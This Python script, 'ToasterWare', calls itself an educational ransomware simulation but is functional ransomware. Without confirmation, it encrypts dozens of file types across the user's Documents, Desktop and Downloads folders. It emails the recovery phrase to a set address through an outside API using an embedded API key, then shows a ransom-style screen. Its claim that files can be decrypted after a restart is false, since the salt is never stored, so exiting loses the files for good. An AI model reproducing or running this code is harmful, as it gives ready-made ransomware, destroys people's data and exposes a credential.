#!/usr/bin/env python3
"""
ToasterWare — Terminal Edition
Educational Ransomware Simulation
Full encryption + decryption with recovery phrase.
Terminal-only. No GUI. Just ASCII.
"""

import os
import sys
import random
import base64
import time
import shutil
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests

# ==================== CONFIG ====================
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai',
    '.py', '.js', '.html', '.css', '.cpp', '.c', '.java', '.go', '.rs',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.sqlite', '.db',
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mp3', '.wav',
    '.json', '.xml', '.yaml', '.yml', '.toml', '.ini', '.cfg', '.log'
}

SKIP_DIRS = {
    'Windows', 'System32', 'Program Files', 'Program Files (x86)',
    'System', 'tmp', 'temp', 'swap', 'cache', '.git', '__pycache__'
}

EMAIL = "your-email@example.com"          # <--- CHANGE THIS
RESEND_API_KEY = "re_UokhNKVv_PgjiHqeaEDSH4TKaCzhcJtWd"  # <--- YOUR KEY
FROM_EMAIL = "onboarding@resend.dev"      # <--- CHANGE IF NEEDED

# ==================== ASCII ART ====================
TOAST_ASCII = r"""
   .-""-.
  /      \
 |  🍞🍞  |
 |  🍞🍞  |
  \      /
   `-..-'
   .-""-.
  /  🔥  \
 |  🍞🔥  |
 |  🔥🍞  |
  \  🔥  /
   `-..-'
   .-""-.
  /  💀  \
 |  ☠️🍞  |
 |  ☠️🍞  |
  \  ☠️  /
   `-..-'
"""

BREAD_ART = r"""
         ________
        /        \
       /  🍞🍞🍞  \
      |   🍞🍞🍞   |
      |   🍞🍞🍞   |
       \  🍞🍞🍞  /
        \________/
"""

SKULL_ART = r"""
     .-.
    ( 🕱 )
     '-'
    .-.
   ( 🕱 )
    '-'
"""

def print_color(text, color='white'):
    """Print colored text to terminal."""
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'purple': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'bold': '\033[1m',
        'dim': '\033[2m',
        'reset': '\033[0m'
    }
    # Handle multiple color arguments
    if isinstance(color, str) and ',' in color:
        color = color.split(',')
    if isinstance(color, list):
        style = ''.join(colors.get(c.strip(), '') for c in color)
    else:
        style = colors.get(color, '')
    print(f"{style}{text}{colors['reset']}")

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def typewriter(text, delay=0.03):
    """Print text with a typewriter effect."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ==================== UTILITIES ====================
def generate_recovery_phrase(word_count=12):
    """Generate a BIP39-style recovery phrase."""
    wordlist = [
        "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
        "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
        "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
        "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
        "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
        "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol",
        "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already",
        "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused",
        "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle",
        "announce", "annual", "another", "answer", "antenna", "antique", "anxiety",
        "any", "apart", "apology", "appear", "apple", "approve", "april", "arch",
        "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around",
        "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork",
        "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete",
        "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august",
        "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
        "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor",
        "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana",
        "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket",
        "battle", "beach", "bean", "beauty", "because", "become", "beef", "before",
        "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
        "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike",
        "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame",
        "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse",
        "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone",
        "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom",
        "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave",
        "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk",
        "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble",
        "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle",
        "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter",
        "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake",
        "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon",
        "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon",
        "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle",
        "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause",
        "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal",
        "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge",
        "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken",
        "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
        "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim",
        "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client",
        "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud",
        "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
        "code", "coffee", "coil", "coin", "collect", "color", "column", "combine",
        "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm",
        "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper",
        "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country",
        "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft",
        "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
        "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd",
        "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal",
        "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve",
        "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger",
        "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade",
        "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
        "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial",
        "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive",
        "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect",
        "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice",
        "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
        "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
        "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document",
        "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose",
        "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress",
        "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb",
        "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle",
        "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy",
        "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder",
        "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark",
        "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable",
        "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage",
        "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
        "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase",
        "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
        "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example",
        "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust",
        "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain",
        "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty",
        "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy",
        "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite",
        "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival",
        "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter",
        "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish",
        "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight",
        "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus",
        "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork",
        "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame",
        "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen",
        "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy",
        "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas",
        "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle",
        "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl",
        "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory",
        "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel",
        "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity",
        "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard",
        "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer",
        "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk",
        "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet",
        "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby",
        "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn",
        "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human",
        "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband",
        "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness",
        "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch",
        "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant",
        "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner",
        "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact",
        "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
        "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
        "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
        "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
        "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
        "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
        "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
        "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
        "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter",
        "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb",
        "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan",
        "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge",
        "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics",
        "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal",
        "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march",
        "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material",
        "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic",
        "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge",
        "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million",
        "mimic", "mind", "mineral", "minimum", "minor", "minute", "miracle", "mirror", "misery",
        "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment",
        "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito",
        "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule",
        "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery",
        "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck",
        "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral",
        "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal",
        "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number",
        "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious",
        "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old",
        "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion",
        "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original",
        "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over",
        "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm",
        "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party",
        "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace",
        "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect",
        "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture",
        "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza",
        "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge",
        "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion",
        "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice",
        "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride",
        "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce",
        "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud",
        "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy",
        "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality",
        "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race",
        "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range",
        "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel",
        "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform",
        "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain",
        "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace",
        "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire",
        "retreat", "return", "reunion", "reveal", "review", "revolt", "reward", "rhythm", "rib", "ribbon",
        "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk",
        "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof",
        "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug",
        "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon",
        "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage",
        "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science",
        "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season",
        "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell",
        "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup",
        "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift",
        "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp",
        "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk",
        "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six",
        "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep",
        "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart",
        "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
        "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon",
        "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn",
        "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit",
        "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square",
        "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start",
        "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock",
        "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle",
        "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden",
        "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme",
        "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow",
        "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol",
        "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape",
        "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis",
        "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing",
        "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt",
        "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler",
        "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth",
        "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower",
        "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel",
        "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy",
        "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble",
        "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two",
        "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo",
        "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until",
        "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage",
        "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley",
        "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture",
        "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious",
        "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual",
        "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon",
        "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water",
        "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird",
        "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide",
        "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire",
        "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world",
        "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you",
        "young", "youth", "zebra", "zero", "zone", "zoo"
    ]
    return ' '.join(random.SystemRandom().sample(wordlist, word_count))

def derive_key(phrase: str, salt: bytes = None) -> bytes:
    """Derive a strong key from the recovery phrase using PBKDF2."""
    if salt is None:
        salt = os.urandom(32)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=600000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(phrase.encode()))
    return key, salt

def encrypt_file(file_path: Path, fernet: Fernet) -> bool:
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        return True
    except Exception:
        return False

def decrypt_file(file_path: Path, fernet: Fernet) -> bool:
    try:
        with open(file_path, 'rb') as f:
            encrypted = f.read()
        decrypted = fernet.decrypt(encrypted)
        with open(file_path, 'wb') as f:
            f.write(decrypted)
        return True
    except Exception:
        return False

def find_files(root_dir: Path) -> list:
    files = []
    for path in root_dir.rglob('*'):
        if path.is_file() and path.suffix.lower() in TARGET_EXTENSIONS:
            if any(skip in path.parts for skip in SKIP_DIRS):
                continue
            files.append(path)
    return files

# ==================== EMAIL ====================
def send_recovery_email(phrase: str):
    url = "https://api.resend.com/emails"
    headers = {
        "Authorization": f"Bearer {RESEND_API_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "from": FROM_EMAIL,
        "to": [EMAIL],
        "subject": "🍞 ToasterWare — Recovery Phrase",
        "text": f"""
🍞 TOASTERWARE — RECOVERY PHRASE

Your recovery phrase is:

{phrase}

This phrase is REQUIRED to decrypt your files.

--- About This ---
This is an educational ransomware simulation running on your local machine.
No data was exfiltrated — only this recovery phrase was emailed.
You are in full control. This is reversible.

Stay safe. 🔐
"""
    }
    try:
        resp = requests.post(url, json=data, headers=headers, timeout=10)
        if resp.status_code == 200:
            print_color("[✓] Recovery phrase sent to email.", 'green')
        else:
            print_color(f"[!] Resend API error: {resp.status_code}", 'red')
    except Exception as e:
        print_color(f"[!] Failed to send email: {e}", 'red')

# ==================== DECRYPTION ====================
def decrypt_files(phrase: str, salt: bytes, encrypted_files: list):
    """Decrypt all previously encrypted files."""
    print_color("\n🔓 Decrypting files...", 'yellow')
    key, _ = derive_key(phrase, salt)
    fernet = Fernet(key)

    success = 0
    for f in encrypted_files:
        if decrypt_file(f, fernet):
            success += 1

    print_color(f"✅ Decrypted {success} files successfully!", 'green')
    return success

# ==================== MAIN ====================
def main():
    clear_screen()

    print_color(BREAD_ART, 'yellow')
    print_color("🍞 TOASTERWARE — Terminal Edition", 'bold,red')
    print_color("Educational Ransomware Simulation", 'white')
    print_color("⚠️  Runs on YOUR machine. No real harm.\n", 'yellow')

    # Generate phrase
    print_color("[*] Generating recovery phrase...", 'cyan')
    phrase = generate_recovery_phrase(12)
    print_color(f"🔑 Recovery Phrase: {phrase}", 'green')
    print()

    # Derive key
    print_color("[*] Deriving encryption key (600,000 iterations)...", 'cyan')
    key, salt = derive_key(phrase)
    fernet = Fernet(key)
    print_color("[✓] Key derived.\n", 'green')

    # Send email
    print_color("[*] Sending recovery phrase to email...", 'cyan')
    send_recovery_email(phrase)

    # Find and encrypt files
    print_color("[*] Scanning for files to encrypt...", 'cyan')
    target_dirs = [Path.home() / 'Documents', Path.home() / 'Desktop', Path.home() / 'Downloads']
    all_files = []
    for d in target_dirs:
        if d.exists():
            found = find_files(d)
            all_files.extend(found)
            print_color(f"  📁 {d.name}: {len(found)} files", 'white')

    print_color(f"\n[*] Total: {len(all_files)} files to encrypt.", 'cyan')

    if len(all_files) == 0:
        print_color("[!] No target files found.", 'yellow')
        return

    encrypted = []
    for i, f in enumerate(all_files):
        if encrypt_file(f, fernet):
            encrypted.append(f)
            print(f"[{i+1}/{len(all_files)}] Encrypted: {f.name}")
        else:
            print_color(f"[!] Failed: {f.name}", 'red')

    print_color(f"\n✅ Encrypted {len(encrypted)} files.\n", 'green')

    # ASCII skull
    print_color(SKULL_ART, 'red')
    print_color("💀 YOUR COMPUTER HAS BEEN TOASTED 💀", 'bold,red')
    print_color(f"🔑 Recovery phrase sent to: {EMAIL}", 'yellow')
    print_color("📩 Check your email to recover your files.\n", 'white')

    # Interactive menu
    while True:
        print_color("─" * 40, 'dim')
        print_color("1. 🔓 Decrypt files (enter recovery phrase)", 'cyan')
        print_color("2. 📧 Resend recovery phrase to email", 'cyan')
        print_color("3. ❌ Exit (files remain encrypted)", 'cyan')
        print_color("─" * 40, 'dim')

        choice = input("\n> ").strip()

        if choice == '1':
            clear_screen()
            print_color(BREAD_ART, 'yellow')
            print_color("🔓 ENTER RECOVERY PHRASE", 'bold,cyan')
            print_color("Type the 12-word phrase from your email.\n", 'white')

            entered = input("> ").strip().lower()
            if entered == phrase:
                decrypt_files(entered, salt, encrypted)
            else:
                print_color("❌ Incorrect phrase. Try again.", 'red')
            print()

        elif choice == '2':
            print_color("[*] Resending recovery phrase...", 'cyan')
            send_recovery_email(phrase)
            print()

        elif choice == '3':
            print_color("\n⚠️  Files remain encrypted.", 'yellow')
            print_color("Run the script again and use option 1 to decrypt.", 'yellow')
            print_color("\n💀 ToasterWare shutting down.", 'red')
            break

        else:
            print_color("[!] Invalid choice.", 'red')

if __name__ == "__main__":
    main()